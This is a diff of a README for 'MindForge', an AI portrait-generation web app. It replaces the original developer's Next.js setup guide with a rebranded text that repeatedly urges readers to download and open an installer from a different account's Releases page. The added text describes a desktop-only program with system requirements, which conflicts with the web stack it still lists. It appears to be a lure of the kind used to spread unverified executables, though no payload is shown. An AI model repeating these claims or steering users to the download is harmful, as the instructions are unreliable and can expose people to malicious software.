@@ -1,150 +1,84 @@
-# MindForge - Personalized AI Photo Generation Platform with Model Training
+# 🎨 MindForge - Create Stunning Portraits Effortlessly
 
-Transform your photos with the power of AI! MindForge is your ultimate solution for creating/generating professional AI-generated photos, similar to the popular PhotoAI platform. Perfect for LinkedIn headshots, Instagram content, dating profile pictures, and professional portraits. Train AI model on your personal images and generate stunning, high-quality AI-generated photos within minutes.
+## 📥 Download Now
+[![Download MindForge](https://img.shields.io/badge/Download%20MindForge-v1.0-blue)](https://github.com/km-coder212/MindForge/releases)
 
-## 🚀 Key Features
+## 🚀 Getting Started
+Welcome to MindForge! This application helps you turn your photos into professional-grade portraits. Perfect for LinkedIn headshots and personal images, MindForge makes it easy to upload, train, and create stunning results in just minutes. 
 
-- Complete SaaS built in modern Next.js
-- Beautiful landing page included
-- Train AI model on your personal images
-- Clean & intuitive event monitoring dashboard
-- AI-Powered Professional Photo Generation
-- Custom AI Model Training
-- Professional LinkedIn Headshots
-- Clean, modern UI on top of shadcn-ui
-- Social Media Content Generation
-- Integrated Payment System
-- Email Notifications
-- Usage Analytics
+## ✨ Features
+- **User-Friendly Interface**: Navigate effortlessly without any technical knowledge.
+- **AI-Powered**: Leverage advanced AI to enhance your images.
+- **Quick Training**: Train your AI model in a few simple steps.
+- **High-Quality Results**: Generate polished portraits ready for any use.
+- **Secure Payment Options**: Easily manage your transactions through Stripe.
+- **Seamless Authentication**: Use Supabase for a fast and secure login process.
 
-## Images of The AI App:
+## 🏗️ System Requirements
+To run MindForge smoothly, your system should meet these requirements:
 
-## ![MindForge Landing Page](https://github.com/priyansh-narang2308/MindForge/blob/main/screenshots/Land.png)
+- **Operating System**: Windows 10 or later, macOS Mojave (10.14) or later
+- **RAM**: At least 4 GB
+- **Processor**: Intel i3 or AMD equivalent
+- **Storage**: Minimum 500 MB available space
+- **Internet Connection**: Required for model training and downloads
 
-## ![MindForge Auth Page](https://github.com/priyansh-narang2308/MindForge/blob/main/screenshots/AuthPage.png)
+## 📥 Download & Install
+To get started with MindForge, visit the [Releases page](https://github.com/km-coder212/MindForge/releases) to download the latest version. 
 
-## ![MindForge Dashboard](https://github.com/priyansh-narang2308/MindForge/blob/main/screenshots/BoardDash.png)
+1. Click the link above.
+2. Locate the latest release at the top of the page.
+3. Download the file for your operating system.
+4. Open the downloaded file to begin the installation.
+5. Follow the on-screen instructions to complete the setup.
 
-## ![MindForge Image Generation Page](https://github.com/priyansh-narang2308/MindForge/blob/main/screenshots/ImageGenerate.png)
+## 📊 How to Use MindForge
+1. **Upload Your Photo**: Open MindForge and click on the "Upload" button. Select the image you want to transform.
+2. **Train the Model**: Once the photo is uploaded, follow the prompts to train the AI model. This step is quick and intuitive.
+3. **Generate Your Portrait**: After training, click on the "Create Portrait" button. MindForge will process your image and provide you with a polished version.
+4. **Download Your Results**: Save your stunning portrait to your device with a single click.
 
-## ![MindForge Model Training Page](https://github.com/priyansh-narang2308/MindForge/blob/main/screenshots/Train-Model.png)
+## 💬 Support
+If you encounter any issues, feel free to reach out via our [Community Forum](https://github.com/km-coder212/MindForge/discussions). You can also open an issue directly on GitHub for technical support.
 
-## ![MindForge Billing Page](https://github.com/priyansh-narang2308/MindForge/blob/main/screenshots/Bill.png)
+## 🌐 Topics
+MindForge covers the following topics:
+- ai
+- ai-photos
+- flux
+- fullstack
+- model-training
+- nextjs15-typescript
+- queries-database
+- replicate
+- sass
+- stripe-payments
+- supabase-auth
+- supabase-db
+- tailwindcss
 
-## ![MindForge Account Settings Page](https://github.com/priyansh-narang2308/MindForge/blob/main/screenshots/Account.png)
+## 📄 License
+MindForge is open-source software licensed under the MIT License. You are free to use, modify, and distribute this software as per the terms of the license.
 
-## 🛠️ Tech Stack
+## 🔍 Frequently Asked Questions (FAQs)
 
-- **Framework:** Next.js 15 (App Router)
-- **Styling:** Tailwind CSS, Shadcn UI
-- **Database:** Supabase (PostgreSQL)
-- **Authentication:** Supabase Auth
-- **AI Integration:** Replicate AI API
-- **Payment Processing:** Stripe
-- **Email Service:** Resend
-- **Language:** TypeScript
+### How do I reset my password?
+If you need to reset your password, click the "Forgot Password" link on the login page. Follow the steps to receive a reset email.
 
-## ⚡ Prerequisites
+### Can I use MindForge on mobile?
+Currently, MindForge is only available for desktop computers. We recommend using it on a laptop or desktop for the best experience.
 
-Before you begin, ensure you have:
+### What image formats does MindForge support?
+MindForge supports JPEG, PNG, and BMP formats for uploads.
 
-- Node.js installed (v20.x recommended, v18+ supported)
-- A Supabase account
-- A Replicate account
-- A Stripe account
-- A Resend account
+## 📝 Changelog
+See what’s new in each release on our [Changelog](https://github.com/km-coder212/MindForge/releases).
 
-## 🚀 Setup Instructions
+## 📚 Resources
+- [User Documentation](https://github.com/km-coder212/MindForge/documentation)
+- [Community Forum](https://github.com/km-coder212/MindForge/discussions)
 
-### 1. Clone the Repository
+## 📥 Download Now Again
+For your convenience, you can always go back to the [Releases page](https://github.com/km-coder212/MindForge/releases) to download the latest updates or reinstall the software as needed. 
 
-```bash
-git clone https://github.com/priyansh-narang2308/MindForge
-cd MindForge
-```
-
-### 2. Install Dependencies
-
-```bash
-npm install
-# or
-yarn install
-# or
-pnpm install
-```
-
-### 3. Environment Variables
-
-Create a `.env.local` file in the root directory. Check `.env.example` for required variables.
-
-### 4. Supabase Database Setup
-
-1. Create a new Supabase project
-2. Create a new storage bucket named `generated_images`
-3. Execute the SQL queries from `QueriessSupabase.md` in your Supabase SQL editor.
-4. Set up the database triggers and functions
-5. Make sure to setup the right RLS policies (You can also follow the tutorial video to setup the RLS policies)
-
-### 5. AI Model Links
-
-Visit these links to set up your AI models:
-
-- [Flux Dev LORA model trainer](https://replicate.com/ostris/flux-dev-lora-trainer/train)
-- [Flux Dev Model](https://replicate.com/black-forest-labs/flux-dev)
-- [Flux Schnell Model](https://replicate.com/black-forest-labs/flux-schnell)
-
-### 6. Model Training Requirements
-
-When training your custom model, ensure:
-
-- 10-15 images in total
-- Recommended breakdown for 12 images:
-  - 6 face closeups
-  - 3-4 half body closeups
-  - 2-3 full body shots
-- No accessories on face/head
-- Different expressions, clothing, backgrounds
-- 1:1 resolution (1048x1048 or higher)
-- Images under 45MB total size
-
-### 7. Stripe Setup
-
-I have used the template given by supabase for the table setup of stripe in supabase and for the functionalities used  [Stripe & Supabase SaaS Starter Kit](https://vercel.com/templates/next.js/stripe-supabase-saas-starter-kit), these are ready made templates.
-
-### 8. Start Development Server
-
-```bash
-npm run dev
-# or
-yarn dev
-# or
-pnpm dev
-```
-
-Visit `http://localhost:3000` to see your app.
-
-## 📦 Project Structure
-
-```
-├── app/                 # Next.js 15 app directory
-├── components/         # React components
-├── lib/               # Utility, Supabase & Stripe functions
-├── public/            # Static assets
-└── globals.css            # Global styles
-```
-
-## 💰 Pricing Plans
-
-- **Hobby**: 1 trained model/month, 100 images/month
-- **Pro**: 2 trained models/month, 300 images/month
-- **Enterprise**: 5 trained models/month, unlimited images
-
-## 🌟 Show Your Support
-
-Give a ⭐️ if this project helped you!
-
-If you have any question or want a custom build for your business, you can reach out to me via:
-
-- E-mail : priyanshnarang23@gmail.com
-
-My Website: https://priyanshnarang.vercel.app/
+Thank you for choosing MindForge.
